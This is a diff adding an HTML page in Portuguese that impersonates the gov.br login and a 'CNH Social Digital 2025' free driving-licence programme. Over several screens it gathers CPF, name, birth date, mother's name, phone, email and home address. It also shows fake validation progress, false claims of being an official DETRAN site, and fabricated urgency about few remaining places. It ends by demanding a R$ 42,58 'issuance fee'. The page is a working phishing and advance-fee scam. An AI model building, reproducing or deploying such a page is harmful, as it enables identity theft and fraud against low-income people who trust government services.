@@ -1,0 +1,2516 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+  <title>CNH Social Digital 2025 - gov.br</title>
+  <link rel="icon" href="images/favicon.ico">
+
+  <meta name="description" content="CNH Social Digital 2025: acompanhe informações, etapas e orientações do serviço digital para solicitação e acompanhamento.">
+  <meta name="keywords" content="CNH Social, CNH Digital, CNH 2025, gov.br, habilitação, serviços digitais, DETRAN">
+  <meta name="robots" content="index, follow, max-image-preview:large">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/all.min.css">
+  <script src="js/qrcode.min.js"></script>
+  <script defer="" src="js/script.js" data-website-id="6b6d0293-be97-4e14-a35f-ccff53a1d121"></script>
+</head>
+
+<body>
+  <header>
+    <div class="header-container">
+      <img src="images/logo.webp" alt="Logo Gov.br" class="logo">
+      <div class="header-icons">
+        <i class="fas fa-universal-access"></i>
+        <i class="fas fa-circle-half-stroke"></i>
+      </div>
+    </div>
+  </header>
+
+  <main id="tela-login">
+    <section class="login-card">
+      <h1>Identifique-se no gov.br com:</h1>
+      <div class="cpf-section">
+        <div class="section-title">
+          <i class="fas fa-id-card"></i>
+          <span>Número do CPF</span>
+        </div>
+        <p>
+          Digite seu CPF para criar ou <strong>acessar</strong> sua conta
+          gov.br
+        </p>
+        <div class="input-group">
+          <label for="cpf">CPF</label>
+          <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)">
+        </div>
+        <button class="btn-continuar" id="btn-entrar" onclick="simularVerificacao()" data-umami-event="login_cpf_continuar">
+          Continuar
+        </button>
+      </div>
+      <div class="outras-opcoes">
+        <p>Outras opções de identificação:</p>
+        <ul class="opcoes-list">
+          <li>
+            <i class="fas fa-university icon-green"></i><span>Login com o seu banco</span>
+          </li>
+          <li>
+            <i class="fas fa-qrcode icon-green"></i><span>Login com QR code</span>
+          </li>
+          <li>
+            <i class="fas fa-certificate icon-blue"></i><span>Seu certificado digital</span>
+          </li>
+          <li>
+            <i class="fas fa-cloud icon-blue"></i><span>Seu certificado digital em nuvem</span>
+          </li>
+        </ul>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA DE CADASTRO DE DADOS (para CPF não encontrado) -->
+  <main id="tela-cadastro-dados" style="display: none">
+    <section class="cadastro-dados-container">
+      <div class="breadcrumb">
+        <span>Cadastro de Dados</span>
+      </div>
+
+      <div class="cadastro-dados-card">
+        <h1>Complete seus Dados</h1>
+        <p>
+          CPF <strong id="cpf-cadastro-display"></strong> não encontrado no
+          sistema. Preencha seus dados para prosseguir.
+        </p>
+
+        <form class="formulario-cadastro">
+          <div class="form-group">
+            <label for="nome-cadastro">Nome Completo <span class="asterisco">*</span></label>
+            <input type="text" id="nome-cadastro" placeholder="Digite seu nome completo" required="">
+          </div>
+
+          <div class="form-group">
+            <label for="data-cadastro">Data de Nascimento <span class="asterisco">*</span></label>
+            <input type="date" id="data-cadastro" required="">
+          </div>
+
+          <div class="form-group">
+            <label for="mae-cadastro">Nome da Mãe <span class="asterisco">*</span></label>
+            <input type="text" id="mae-cadastro" placeholder="Digite o nome de sua mãe" required="">
+          </div>
+        </form>
+
+        <button class="btn-continuar" onclick="confirmarCadastroDados()" data-umami-event="cadastro_dados_continuar">
+          Continuar
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 2: INFORMAÇÕES CNH SOCIAL -->
+  <main id="tela-informacoes" style="display: none">
+    <section class="info-container">
+      <div class="user-greeting">
+        <h2 id="nome-usuario">OI!</h2>
+        <p>CPF: <span id="display-cpf">-</span></p>
+      </div>
+
+      <div class="content-card">
+        <h1 class="main-title">
+          CNH Social Digital 2025: A Oportunidade de Realizar o Seu Sonho
+        </h1>
+        <p>
+          O Governo Federal, através do programa <strong>CNH Social</strong>,
+          oferece a oportunidade de obter a Carteira Nacional de Habilitação
+          totalmente gratuita. Se você atende aos critérios, essa pode ser a
+          sua chance de conquistar a tão sonhada CNH que falta em sua vida.
+        </p>
+
+        <div class="inscricoes-box">
+          <h3>INSCRIÇÕES ABERTAS!</h3>
+          <p>De <strong>10/12/2025 a 08/02/2026</strong></p>
+          <p>
+            Consulte o edital de seu município para mais informações e faça já
+            a sua inscrição!
+          </p>
+          <button class="btn-elegibilidade" onclick="irParaVerificacao()" data-umami-event="informacoes_verificar_elegibilidade">
+            Verificar Elegibilidade
+          </button>
+        </div>
+
+        <div class="atencao-section">
+          <h3>ATENÇÃO!</h3>
+          <p>
+            A CNH Social Digital 2025 é um programa do Governo Federal que
+            visa garantir o acesso à primeira habilitação (categoria AB) de
+            forma totalmente gratuita aos brasileiros de baixa renda que se
+            enquadrem nos critérios estabelecidos. Ao fim, você terá sua CNH
+            física e receberá o certificado que comprova sua habilitação
+            (categoria A ou B) ao fim do curso prático, que permite a condução
+            de veículos das categorias treinadas durante o curso, até a
+            emissão da CNH definitiva.
+            <strong>Não deixe passar essa chance de melhorar a mobilidade e
+              conquistar a cidadania necessária ao trabalho.</strong>Processo 100% Digital: Candidatar-se ao programa e
+            acompanhar sua
+            inscrição de forma totalmente online.
+          </p>
+        </div>
+
+        <div class="passos-section">
+          <h3>
+            Para verificar se você pode obter a CNH facilmente, siga os passos
+            abaixo:
+          </h3>
+          <ul class="passos-list">
+            <li>
+              <i class="fas fa-file-alt"></i>
+              <div class="passo-content">
+                <strong>Tenha seus dados em mãos</strong>
+                <p>CPF, RG e comprovante de renda</p>
+              </div>
+            </li>
+            <li>
+              <i class="fas fa-circle-check"></i>
+              <div class="passo-content">
+                <strong>Preencha todos os dados no site da Receita Federal</strong>
+                <p>Acesso gov.br (nível bronze ou acima)</p>
+              </div>
+            </li>
+            <li>
+              <i class="fas fa-briefcase"></i>
+              <div class="passo-content">
+                <strong>Realize um único protocolo enviar toda a documentação via
+                  site gov.br</strong>
+                <p>
+                  Após enquadramento, siga as instruções de envio da sua
+                  documentação
+                </p>
+              </div>
+            </li>
+          </ul>
+        </div>
+
+        <div class="elegibilidade-section">
+          <h2>Descubra se Você Pode Participar do CNH Social Digital 2025</h2>
+          <button class="btn-elegibilidade" onclick="irParaVerificacao()" data-umami-event="informacoes_verificar_elegibilidade">
+            Verificar Elegibilidade
+          </button>
+        </div>
+
+        <div class="requisitos-section">
+          <ul class="requisitos-list">
+            <li>
+              <i class="fas fa-check-circle"></i>
+              <div class="req-content">
+                <strong>Ter CPF ativo:</strong> O programa é exclusivo a
+                candidatos brasileiros com cadastros ativos em qualquer parte
+                do Brasil.
+              </div>
+            </li>
+            <li>
+              <i class="fas fa-check-circle"></i>
+              <div class="req-content">
+                <strong>Não possuir CNH:</strong> O programa é destinado
+                apenas à primeira habilitação. Aqueles que já possuem CNH e
+                querem mudar de categoria ou renovar não são elegíveis.
+              </div>
+            </li>
+            <li>
+              <i class="fas fa-check-circle"></i>
+              <div class="req-content">
+                <strong>Ter mais de 18 anos ou emancipado:</strong> É
+                necessário ter, no mínimo, 18 anos completos. Menores
+                emancipados também podem fazer parte.
+              </div>
+            </li>
+            <li>
+              <i class="fas fa-check-circle"></i>
+              <div class="req-content">
+                <strong>Renda familiar de até meio salário mínimo:</strong> Ou
+                seja, a renda de toda a família dividida pelos membros não
+                pode exceder R$ 706,00 por pessoa.
+              </div>
+            </li>
+            <li>
+              <i class="fas fa-check-circle"></i>
+              <div class="req-content">
+                <strong>Atender a outras critérios locais:</strong> Cada
+                estado pode ter outros critérios específicos, como residir no
+                estado há um determinado tempo ou estar no Cadastro Único,
+                para poder se enquadrar na prioridade.
+              </div>
+            </li>
+          </ul>
+        </div>
+
+        <div class="resultado-section">
+          <h2>Resultado do Processo Seletivo 2025</h2>
+          <div class="resultado-items">
+            <div class="resultado-item">
+              <i class="fas fa-calendar-alt"></i>
+              <div class="resultado-content">
+                <strong>A data de divulgação:</strong>
+                <p>A partir de 28/03/2026</p>
+              </div>
+            </div>
+            <div class="resultado-item">
+              <i class="fas fa-user"></i>
+              <div class="resultado-content">
+                <strong>No site oficial do DETRAN:</strong>
+                <p>O resultado oficial será divulgado</p>
+              </div>
+            </div>
+            <div class="resultado-item">
+              <i class="fas fa-file-alt"></i>
+              <div class="resultado-content">
+                <strong>Após enquadramento no programa:</strong>
+                <p>
+                  Após envio documentação e resultado positivo, aguarde
+                  contato
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 3: VERIFICAÇÃO DE IDENTIDADE -->
+  <main id="tela-verificacao" style="display: none">
+    <section class="verificacao-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Inicio</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>CNH Social Digital</span>
+      </div>
+
+      <div class="verificacao-card">
+        <h1>Verificação de Identidade</h1>
+        <p>
+          Para garantir a segurança do seu processo, por favor confirme sua
+          data de nascimento selecionando a opção correta abaixo.
+        </p>
+
+        <div class="data-nascimento-section">
+          <div class="section-label">
+            <span class="label-number">1</span>
+            <span class="label-text">Selecione sua Data de Nascimento:</span>
+          </div>
+
+          <div class="opcoes-data">
+            <label class="radio-option">
+              <input type="radio" name="data-nascimento" value="03/06/1987">
+              <span class="radio-custom"></span>
+              <span class="radio-text">03/06/1987</span>
+            </label>
+
+            <label class="radio-option">
+              <input type="radio" name="data-nascimento" value="15/07/1965">
+              <span class="radio-custom"></span>
+              <span class="radio-text">15/07/1965</span>
+            </label>
+
+            <label class="radio-option">
+              <input type="radio" name="data-nascimento" value="25/08/1954">
+              <span class="radio-custom"></span>
+              <span class="radio-text">25/08/1954</span>
+            </label>
+
+            <label class="radio-option">
+              <input type="radio" name="data-nascimento" value="28/10/1976">
+              <span class="radio-custom"></span>
+              <span class="radio-text">28/10/1976</span>
+            </label>
+          </div>
+        </div>
+
+        <div class="info-section">
+          <i class="fas fa-info-circle"></i>
+          <div class="info-content">
+            <strong>Por que verificamos sua data de nascimento?</strong>
+            <p>
+              Esta verificação é necessária para confirmar sua identidade e
+              garantir a segurança do processo de inscrição.
+            </p>
+          </div>
+        </div>
+
+        <button class="btn-continuar-verificacao" onclick="continuarVerificacao()">
+          Continuar
+        </button>
+
+        <div class="seguranca-section">
+          <h3>Processo 100% Seguro</h3>
+          <p>
+            Todas as informações são validadas pelos sistemas oficiais do
+            Governo Federal, garantindo total segurança e autenticidade em seu
+            processo de inscrição.
+          </p>
+          <div class="seguranca-items">
+            <div class="seguranca-item">
+              <i class="fas fa-shield-alt"></i>
+              <span>Verificação de Identidade</span>
+            </div>
+            <div class="seguranca-item">
+              <i class="fas fa-lock"></i>
+              <span>Proteção SSL</span>
+            </div>
+            <div class="seguranca-item">
+              <i class="fas fa-file-contract"></i>
+              <span>Dados Oficiais</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 4: INFORMAÇÕES DE CONTATO -->
+  <main id="tela-contato" style="display: none">
+    <section class="contato-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Inicio</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>CNH Social Digital</span>
+      </div>
+
+      <div class="contato-card">
+        <h1>Verificação de Identidade</h1>
+        <p>
+          Preencha este breve questionário para verificarmos sua elegibilidade
+          para a CNH Digital Social. Este é um passo inicial e não garante a
+          emissão da CNH.
+        </p>
+
+        <div class="formulario-section">
+          <div class="form-item">
+            <div class="item-number">3</div>
+            <label for="telefone">Qual é seu telefone?</label>
+            <input type="tel" id="telefone" placeholder="(00) 00000-0000" oninput="mascaraTelefone(this)">
+          </div>
+
+          <div class="form-item">
+            <div class="item-number">4</div>
+            <label for="email">Qual é seu e-mail?</label>
+            <input type="email" id="email" placeholder="seu@email.com">
+          </div>
+        </div>
+
+        <button class="btn-confirmar" onclick="confirmarContato()">
+          Confirmar
+        </button>
+
+        <div class="seguranca-section">
+          <h3>Processo 100% Seguro</h3>
+          <p>
+            Todas as informações são validadas pelos sistemas oficiais do
+            Governo Federal, garantindo total segurança e autenticidade em seu
+            processo de inscrição.
+          </p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 5: VALIDAÇÃO DE DADOS -->
+  <main id="tela-validacao" style="display: none">
+    <section class="validacao-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Inicio</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>CNH Social Digital</span>
+      </div>
+
+      <div class="validacao-card">
+        <h1>Validando seus dados</h1>
+        <p>
+          Nossos sistemas oficiais irão analisar seus dados para confirmar se
+          são válidos para o cadastro no programa.
+        </p>
+
+        <div class="progress-section">
+          <div class="progress-labels">
+            <span>0%</span>
+            <span>Verificação em Progresso</span>
+            <span>100%</span>
+          </div>
+          <div class="progress-bar-container">
+            <div class="progress-bar" id="progress-bar"></div>
+          </div>
+        </div>
+
+        <div class="validacoes-list">
+          <div class="validacao-item">
+            <i class="fas fa-check-circle" style="color: #2e7d32"></i>
+            <div class="validacao-text" style="color: #2e7d32">
+              <strong>Verificando Nome completo</strong>
+              <p>Consultando cadastro nacional</p>
+            </div>
+          </div>
+          <div class="validacao-item">
+            <i class="fas fa-spinner fa-spin" style="color: #0044ab"></i>
+            <div class="validacao-text">
+              <strong>Verificando CPF</strong>
+              <p>Consultando bases da Receita Federal</p>
+            </div>
+          </div>
+          <div class="validacao-item">
+            <i class="fas fa-clock" style="color: #999"></i>
+            <div class="validacao-text">
+              <strong>Validando Data de Nascimento</strong>
+              <p>Comparação com registros oficiais</p>
+            </div>
+          </div>
+          <div class="validacao-item">
+            <i class="fas fa-clock" style="color: #999"></i>
+            <div class="validacao-text">
+              <strong>Verificando legitimidade</strong>
+              <p>Análise de documentação</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="seguranca-section">
+          <i class="fas fa-check-circle" style="color: #2e7d32; font-size: 24px"></i>
+          <div>
+            <h3>Sistema de Verificação Segura</h3>
+            <p>
+              A verificação de identidade é realizada utilizando conexão
+              criptografada e todos os seus dados são processados com os mais
+              altos padrões de segurança em conformidade com a Lei Geral de
+              Proteção de Dados (LGPD).
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 6: QUESTIONÁRIO -->
+  <main id="tela-questionario" style="display: none">
+    <section class="questionario-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Inicio</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>CNH Social Digital</span>
+      </div>
+
+      <div class="questionario-card">
+        <h1>Questionário</h1>
+        <p>
+          Complete o questionário para prosseguir com o processo de aquisição
+          do CNH Digital.
+        </p>
+
+        <div class="badges-section">
+          <span class="badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+          <span class="badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+          <span class="badge"><i class="fas fa-lock-open"></i> Dados Protegidos</span>
+        </div>
+
+        <div class="ambiente-section">
+          <i class="fas fa-info-circle"></i>
+          <div>
+            <strong>Ambiente Verificado</strong>
+            <p>
+              Esta é uma página oficial do DETRAN para verificação de
+              identidade. Seus dados serão utilizados apenas para verificar
+              sua elegibilidade para adquirir o benefício.
+            </p>
+          </div>
+        </div>
+
+        <div class="progress-bar-container" style="margin: 30px 0">
+          <div class="progress-bar" id="progress-pergunta" style="width: 20%;"></div>
+        </div>
+
+        <div id="pergunta-container"><div class="pergunta-section">
+        <div class="pergunta-numero">1</div>
+        <label class="pergunta-texto">Qual sua idade?</label>
+        <div class="opcoes-pergunta">
+            
+            <label class="opcao-radio">
+                <input type="radio" name="pergunta1" value="Menor de 18 (Inapto)">
+                <span class="radio-custom"></span>
+                <span class="radio-text">Menor de 18 (Inapto)</span>
+            </label>
+        
+            <label class="opcao-radio">
+                <input type="radio" name="pergunta1" value="18 a 24">
+                <span class="radio-custom"></span>
+                <span class="radio-text">18 a 24</span>
+            </label>
+        
+            <label class="opcao-radio">
+                <input type="radio" name="pergunta1" value="25 a 35">
+                <span class="radio-custom"></span>
+                <span class="radio-text">25 a 35</span>
+            </label>
+        
+            <label class="opcao-radio">
+                <input type="radio" name="pergunta1" value="36 a 45">
+                <span class="radio-custom"></span>
+                <span class="radio-text">36 a 45</span>
+            </label>
+        
+            <label class="opcao-radio">
+                <input type="radio" name="pergunta1" value="Acima de 45">
+                <span class="radio-custom"></span>
+                <span class="radio-text">Acima de 45</span>
+            </label>
+        
+        </div>
+    </div></div>
+
+        <button class="btn-continuar-quest" onclick="proximaPergunta()">
+          Continuar
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 7: RESULTADO -->
+  <main id="tela-resultado" style="display: none">
+    <section class="resultado-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Inicio</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>CNH Social Digital</span>
+      </div>
+
+      <div class="resultado-card">
+        <h1 id="resultado-titulo">
+          Parabéns, <span id="nome-resultado">-</span>!
+        </h1>
+        <p id="resultado-mensagem">
+          Seu CPF foi validado no programa CNH Social Digital 2025.
+        </p>
+
+        <div class="circulo-container">
+          <svg viewBox="0 0 120 120" class="circulo-svg">
+            <defs>
+              <linearGradient id="gradient-progresso" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color: #0044ab; stop-opacity: 1"></stop>
+                <stop offset="100%" style="stop-color: #2e7d32; stop-opacity: 1"></stop>
+              </linearGradient>
+            </defs>
+            <circle cx="60" cy="60" r="45" class="circulo-fundo"></circle>
+            <circle cx="60" cy="60" r="45" id="circulo-progresso" class="circulo-progresso"></circle>
+          </svg>
+          <div class="percentual" id="percentual-texto">0%</div>
+        </div>
+
+        <p class="finalize-texto">
+          Finalize seu cadastro para garantir sua vaga.
+          <span class="dots">• • •</span>
+        </p>
+
+        <div class="estatisticas">
+          <div class="stat-item">
+            <div class="stat-numero">3.445.900</div>
+            <div class="stat-label">Realizados</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-numero">6.850</div>
+            <div class="stat-label">Disponíveis</div>
+          </div>
+        </div>
+
+        <div class="seguranca-section-resultado">
+          <i class="fas fa-check-circle"></i>
+          <div>
+            <h3>Processo 100% Seguro</h3>
+            <p>
+              Seus dados são protegidos pelos mais altos padrões de segurança,
+              com certificação de proteção de dados em conformidade com a
+              LGPD. Após a verificação bem-sucedida, você será redirecionado
+              para a área de finalização de cadastro.
+            </p>
+          </div>
+        </div>
+
+        <div class="duvidas-section">
+          <i class="fas fa-question-circle"></i>
+          <span>Dúvidas sobre o processo de verificação?</span>
+        </div>
+
+        <div class="atencao-section-resultado">
+          <h3>Atenção!</h3>
+          <p>
+            Restam poucas vagas disponíveis no Programa CNH Social. Não perca
+            a oportunidade de garantir seu benefício!
+          </p>
+        </div>
+
+        <button class="btn-emitir-cadastro" onclick="emitirCadastro()">
+          Emitir Cadastro
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 8: CADASTRO DE ENDEREÇO -->
+  <main id="tela-endereco" style="display: none">
+    <section class="endereco-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Inicio</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>CNH Social Digital</span>
+      </div>
+
+      <div class="endereco-card">
+        <h1>Cadastro de Endereço</h1>
+        <p>
+          Preencha os dados do seu endereço para prosseguir com o processo da
+          CNH Digital Social.
+        </p>
+
+        <div class="info-importante">
+          <span class="info-label">Importante:</span> Digite seu CEP para
+          verificar as vagas disponíveis. Suas informações são protegidas por
+          criptografia.
+        </div>
+
+        <form class="formulario-endereco">
+          <div class="form-group">
+            <label for="cep">CEP <span class="asterisco">*</span></label>
+            <input type="text" id="cep" placeholder="00000-000" maxlength="9" oninput="mascaraCEP(this)">
+          </div>
+
+          <div class="form-group">
+            <label for="logradouro">Logradouro <span class="asterisco">*</span></label>
+            <input type="text" id="logradouro" placeholder="Ex: Rua, Avenida, etc.">
+          </div>
+
+          <div class="form-group">
+            <label for="numero">Número <span class="asterisco">*</span></label>
+            <input type="text" id="numero" placeholder="Nº">
+          </div>
+
+          <div class="form-group">
+            <label for="complemento">Complemento</label>
+            <input type="text" id="complemento" placeholder="Ex: Apartamento, bloco, etc.">
+          </div>
+
+          <div class="form-group">
+            <label for="bairro">Bairro <span class="asterisco">*</span></label>
+            <input type="text" id="bairro" placeholder="Bairro">
+          </div>
+
+          <div class="form-group">
+            <label for="cidade">Cidade <span class="asterisco">*</span></label>
+            <input type="text" id="cidade" placeholder="Cidade">
+          </div>
+
+          <div class="form-group">
+            <label for="estado">Estado <span class="asterisco">*</span></label>
+            <select id="estado">
+              <option value="">Selecione o Estado</option>
+              <option value="AC">Acre</option>
+              <option value="AL">Alagoas</option>
+              <option value="AP">Amapá</option>
+              <option value="AM">Amazonas</option>
+              <option value="BA">Bahia</option>
+              <option value="CE">Ceará</option>
+              <option value="DF">Distrito Federal</option>
+              <option value="ES">Espírito Santo</option>
+              <option value="GO">Goiás</option>
+              <option value="MA">Maranhão</option>
+              <option value="MT">Mato Grosso</option>
+              <option value="MS">Mato Grosso do Sul</option>
+              <option value="MG">Minas Gerais</option>
+              <option value="PA">Pará</option>
+              <option value="PB">Paraíba</option>
+              <option value="PR">Paraná</option>
+              <option value="PE">Pernambuco</option>
+              <option value="PI">Piauí</option>
+              <option value="RJ">Rio de Janeiro</option>
+              <option value="RN">Rio Grande do Norte</option>
+              <option value="RS">Rio Grande do Sul</option>
+              <option value="RO">Rondônia</option>
+              <option value="RR">Roraima</option>
+              <option value="SC">Santa Catarina</option>
+              <option value="SP">São Paulo</option>
+              <option value="SE">Sergipe</option>
+              <option value="TO">Tocantins</option>
+            </select>
+          </div>
+        </form>
+
+        <button class="btn-proxima-etapa" onclick="validarEndereco()">
+          Próxima Etapa
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA DE AUTO ESCOLA ENCONTRADA -->
+  <main id="tela-auto-escola" style="display: none">
+    <section class="auto-escola-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Início</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>Auto Escola Encontrada</span>
+      </div>
+
+      <div class="auto-escola-card">
+        <h1>Encontramos uma Auto Escola parceira perto de você</h1>
+
+        <div class="info-importante">
+          <span class="info-label">Localização confirmada com sucesso.</span>
+          <p>
+            Identificamos uma autoescola credenciada pelo DETRAN próxima à sua
+            região, apta a prestar atendimento.
+          </p>
+          <p>
+            Após a conclusão do seu cadastro, você receberá, por
+            <strong>E-MAIL e SMS</strong>, todas as informações necessárias,
+            incluindo o endereço completo e os horários de funcionamento da
+            autoescola parceira.
+          </p>
+        </div>
+
+        <div class="info-importante" style="background-color: #fff3cd; border-left-color: #ffc107">
+          <span class="info-label" style="color: #856404">🔒 Processo 100% Seguro:</span>
+          Seus dados são protegidos pelos mais altos padrões de segurança, com
+          certificação de proteção de dados em conformidade com a LGPD.
+        </div>
+
+        <button class="btn-finalizar" onclick="finalizarCadastro()">
+          Finalizar Cadastro
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA DE APROVAÇÃO -->
+  <main id="tela-aprovacao" style="display: none">
+    <section class="aprovacao-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Início</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>Aprovado</span>
+      </div>
+
+      <div class="aprovacao-card">
+        <h1>Seus dados foram aprovados</h1>
+
+        <div class="protocolo-box">
+          <i class="fas fa-file-alt"></i>
+          <div class="protocolo-content">
+            <span class="protocolo-label">Protocolo de Inscrição:</span>
+            <span class="protocolo-numero" id="numero-protocolo">-</span>
+          </div>
+        </div>
+
+        <div class="cartao-dados">
+          <div class="cartao-header">
+            <p class="cartao-pais">REPÚBLICA FEDERATIVA DO BRASIL</p>
+            <p class="cartao-org">MINISTÉRIO DAS CIDADES - DENATRAN</p>
+          </div>
+          <div class="cartao-nome">
+            <p id="cartao-nome-usuario">
+              -
+            </p>
+          </div>
+          <div class="cartao-dados-pessoais">
+            <div class="cartao-campo">
+              <span class="cartao-label">CPF:</span>
+              <span class="cartao-valor" id="cartao-cpf">-</span>
+            </div>
+            <div class="cartao-campo">
+              <span class="cartao-label">NASC:</span>
+              <span class="cartao-valor" id="cartao-nasc">-</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="taxa-box">
+          <div class="taxa-header">
+            <i class="fas fa-info-circle"></i>
+            <span>Taxa de Emissão e Ativação Digital</span>
+          </div>
+          <p>
+            Para validar sua participação no programa, é necessária o
+            pagamento único de <strong>R$ 42,58</strong>.
+          </p>
+          <p class="taxa-descricao">Esse valor assegura:</p>
+          <ul class="taxa-lista">
+            <li><i class="fas fa-check"></i> Emissão da CNH Digital</li>
+            <li><i class="fas fa-check"></i> Acesso à plataforma nacional</li>
+            <li>
+              <i class="fas fa-check"></i> Custos de integração com órgãos de
+              trânsito
+            </li>
+          </ul>
+        </div>
+
+        <div class="validacao-box">
+          <h3>
+            Dados validado com sucesso no Sistema Nacional de Benefícios (SNR)
+          </h3>
+          <p>
+            Parabéns <strong id="nome-validacao">-</strong> você foi
+            aprovado com sucesso e já pode marcar seu exame médico e
+            psicotécnico! A conclusão dessa verificação é essencial para a
+            liberação das aulas teóricas e práticas na autoescola parceira.
+          </p>
+        </div>
+
+        <div class="acompanhamento-box">
+          <h3>Acompanhamento do Processo</h3>
+          <div class="acompanhamento-dados">
+            <div class="acomp-campo">
+              <span class="acomp-label">Nome Completo:</span>
+              <span class="acomp-valor" id="acomp-nome">-</span>
+            </div>
+            <div class="acomp-campo">
+              <span class="acomp-label">CPF:</span>
+              <span class="acomp-valor" id="acomp-cpf">-</span>
+            </div>
+            <div class="acomp-campo">
+              <span class="acomp-label">PROTOCOLO:</span>
+              <span class="acomp-valor" id="acomp-protocolo">-</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="info-agendamento">
+          <i class="fas fa-info-circle"></i>
+          <p>
+            Após a confirmação do pagamento da taxa de emissão, o sistema
+            realizará automaticamente o agendamento dos exames obrigatórios em
+            clínicas credenciadas ao programa. Todas as instruções necessárias
+            para a realização dos exames e início das aulas teóricas e
+            práticas serão enviadas ao seu e-mail cadastrado.
+          </p>
+        </div>
+
+        <div class="checklist-box">
+          <div class="checklist-item completo">
+            <i class="fas fa-check-circle"></i>
+            <span>Dados validados</span>
+          </div>
+          <div class="checklist-item incompleto">
+            <i class="fas fa-times-circle"></i>
+            <span>Exame psicotécnico</span>
+            <i class="fas fa-info-circle info-icon"></i>
+          </div>
+          <div class="checklist-item incompleto">
+            <i class="fas fa-times-circle"></i>
+            <span>Exame Médico</span>
+            <i class="fas fa-info-circle info-icon"></i>
+          </div>
+        </div>
+
+        <button class="btn-marcar-exames" onclick="marcarExames()">
+          Marcar Exames
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- MODAL DE AGENDAMENTO -->
+  <div id="modal-agendamento" class="modal-agendamento" style="display: none">
+    <div class="modal-content">
+      <span class="modal-close" onclick="fecharAgendamento()">×</span>
+
+      <h2>AGENDAR AVALIAÇÃO</h2>
+
+      <div class="calendario-header">
+        <button class="btn-mes" onclick="mesAnterior()"><</button>
+        <select id="mes-select" onchange="mudarMes()" class="mes-select">
+          <option value="0">Janeiro</option>
+          <option value="1">Fevereiro</option>
+        </select>
+        <select id="ano-select" onchange="mudarAno()" class="ano-select">
+          <option value="2026">2026</option>
+        </select>
+        <button class="btn-mes" onclick="mesProximo()">></button>
+      </div>
+
+      <div id="calendario-container">
+        <div class="dia-semana">Dom</div>
+        <div class="dia-semana">Seg</div>
+        <div class="dia-semana">Ter</div>
+        <div class="dia-semana">Qua</div>
+        <div class="dia-semana">Qui</div>
+        <div class="dia-semana">Sex</div>
+        <div class="dia-semana">Sab</div>
+        <div id="calendario-dias"></div>
+      </div>
+
+      <p class="data-selecionada">
+        Data selecionada: <strong id="data-escolhida">Nenhuma</strong>
+      </p>
+
+      <button class="btn-agendar" onclick="realizarAgendamento()">
+        REALIZAR AGENDAMENTO
+      </button>
+    </div>
+  </div>
+
+  <div id="overlay-agendamento" class="overlay-agendamento" style="display: none" onclick="fecharAgendamento()"></div>
+
